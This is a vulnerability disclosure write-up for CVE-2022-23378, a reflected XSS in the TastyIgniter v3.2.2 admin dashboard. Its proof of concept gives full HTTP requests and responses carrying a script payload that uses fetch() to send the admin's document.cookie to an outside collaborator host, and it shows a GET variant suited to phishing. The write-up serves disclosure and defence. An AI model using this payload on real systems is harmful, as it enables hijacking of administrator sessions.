# CVE-2022-23378 : Reflected XSS in TastyIgniter v3.2.2 Restaurtant CMS

Authenticated reflected XSS exists in the TastyIgniter Admin dashboard in version v3.2.2.

Mitre URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23378

NIST URL: https://nvd.nist.gov/vuln/detail/CVE-2022-23378

## Proof of Concept (POC):

### Admin Dashboard Allergens:

**Affected URL:** `/admin/allergens/edit/1?items%5B0%5D%5Bpath%5D=%2fdoesnotexist%3cscript%3efetch('https%3a%2f%2fvgfx3ortri1x8mjfw16ngmpq2h8awz.burpcollaborator.net'%2c%7bmethod%3a%20'POST'%2cmode%3a%20'no-cors'%2cbody%3adocument.cookie%7d)%3b%3c%2fscript%3e%20`

**Source code file affected:** `./vendor/league/flysystem/src/FileNotFoundException.php`

When updating an allergen within the administrator dashboard, an option to attach an image to the allergen is available. When attached, a POST request with parameters pertaining to data about the image is submitted. The parameter `items%5B0%5D%5Bpath%5D` is vulnerable to JavaScript injection, resulting in a potential vector for Cross-Site Scripting (XSS). When including the XSS payload, the server responds with an error message containing and executing the XSS payload. 

Original POST request with XSS payload:
```http
POST /admin/allergens/edit/1 HTTP/1.1
Host: <REDACTED>
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-IGNITER-REQUEST-HANDLER: formThumb::onAddAttachment
X-CSRF-TOKEN: Y----8<----C8n
X-Requested-With: XMLHttpRequest
Origin: http://<REDACTED>
Connection: close
Cookie: tastyigniter_session=ey----8<----n0%3D; admin_auth=ey----8<----0%3D; ti_activeFormSaveAction=%22close%22
Cache-Control: no-transform

items%5B0%5D%5Bname%5D=image.jpeg&items%5B0%5D%5Bpath%5D=%2fdoesnotexist%3cscript%3efetch('https%3a%2f%2fvgfx3ortri1x8mjfw16ngmpq2h8awz.burpcollaborator.net'%2c%7bmethod%3a%20'POST'%2cmode%3a%20'no-cors'%2cbody%3adocument.cookie%7d)%3b%3c%2fscript%3e%20&items%5B0%5D%5Bsize%5D=192&items%5B0%5D%5BlastModified%5D=1642193919&items%5B0%5D%5Btype%5D=file&items%5B0%5D%5BpublicUrl%5D=http%3A%2F%2F<REDACTED>%2Fassets%2Fmedia%2Fuploads%2Fimage.jpeg
```

![01_Original_POST](https://raw.githubusercontent.com/TheGetch/CVE-2022-23378/main/01_Original_POST.png)

Server Response:

```html
HTTP/1.1 500 Internal Server Error
Date: Fri, 14 Jan 2022 21:21:27 GMT
Server: Apache/2.4.38 (Debian)
Cache-Control: no-cache, private
Set-Cookie: tastyigniter_session=e----8<----In0%3D; expires=Fri, 14-Jan-2022 23:21:27 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Content-Length: 183
Connection: close
Content-Type: text/html; charset=UTF-8

File not found at path: uploads/doesnotexist<script>fetch('https:/vgfx3ortri1x8mjfw16ngmpq2h8awz.burpcollaborator.net',{method: 'POST',mode: 'no-cors',body:document.cookie});</script>
```

Furthermore, the request can be changed to a GET request with the affected parameter included within the URL, further increasing the likelihood of success for an adversary to exploit on a phished victim. 

Modified GET request:

```http
GET /admin/allergens/edit/1?items%5B0%5D%5Bpath%5D=%2fdoesnotexist%3cscript%3efetch('https%3a%2f%2fvgfx3ortri1x8mjfw16ngmpq2h8awz.burpcollaborator.net'%2c%7bmethod%3a%20'POST'%2cmode%3a%20'no-cors'%2cbody%3adocument.cookie%7d)%3b%3c%2fscript%3e%20 HTTP/1.1
Host: <REDACTED>
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-IGNITER-REQUEST-HANDLER: formThumb::onAddAttachment
X-CSRF-TOKEN: Y----8<----C8n
X-Requested-With: XMLHttpRequest
Origin: http://<REDACTED>
Connection: close
Cookie: tastyigniter_session=ey----8<----n0%3D; admin_auth=ey----8<----0%3D; ti_activeFormSaveAction=%22close%22
Cache-Control: no-transform


```

![02_Modified_GET](https://raw.githubusercontent.com/TheGetch/CVE-2022-23378/main/02_Modified_GET.png)

Response remains the same:

```html
HTTP/1.1 500 Internal Server Error
Date: Fri, 14 Jan 2022 21:21:27 GMT
Server: Apache/2.4.38 (Debian)
Cache-Control: no-cache, private
Set-Cookie: tastyigniter_session=eyJpdiI6Ik16bUtDZUV6eEw3RzByeG1LTWNBdUE9PSIsInZhbHVlIjoiQUgrTkJ1b2tmMzlFenVDVFlZZ1FHa0d5eVVITUFvT0t0YS9vcklNaHRKMnJYQjYwUyt5S3EySVpLWkpCSzR0YkhTS283VHV4d21KRjhCeHBZQ2NXbGlVRFVBcm9jR1dZbVlsdGZEdzFGZzQwQ2VjVjN1VkZ6ZWh2NmRGZis5dFEiLCJtYWMiOiI3YWQ4ZTM0NzBkZWIyZTNmNmE2OWM3NmJkMWJkYzgwNWYzYzRkNjQ2NjY5OGU2NzhkNjY5YTRlMWNmOTFiMjY0IiwidGFnIjoiIn0%3D; expires=Fri, 14-Jan-2022 23:21:27 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Content-Length: 183
Connection: close
Content-Type: text/html; charset=UTF-8

File not found at path: uploads/doesnotexist<script>fetch('https:/vgfx3ortri1x8mjfw16ngmpq2h8awz.burpcollaborator.net',{method: 'POST',mode: 'no-cors',body:document.cookie});</script>
```

![03_Server_Response](https://raw.githubusercontent.com/TheGetch/CVE-2022-23378/main/03_Server_Response.png)

**Collaborator Interaction:**

![04_Collaborator_Hit](https://raw.githubusercontent.com/TheGetch/CVE-2022-23378/main/04_Collaborator_Hit.png)

![05_Collaborator_Interaction](https://raw.githubusercontent.com/TheGetch/CVE-2022-23378/main/05_Collaborator_Interaction.png)


## Discovery
January 2022
- Eric Getchell - TheGetch
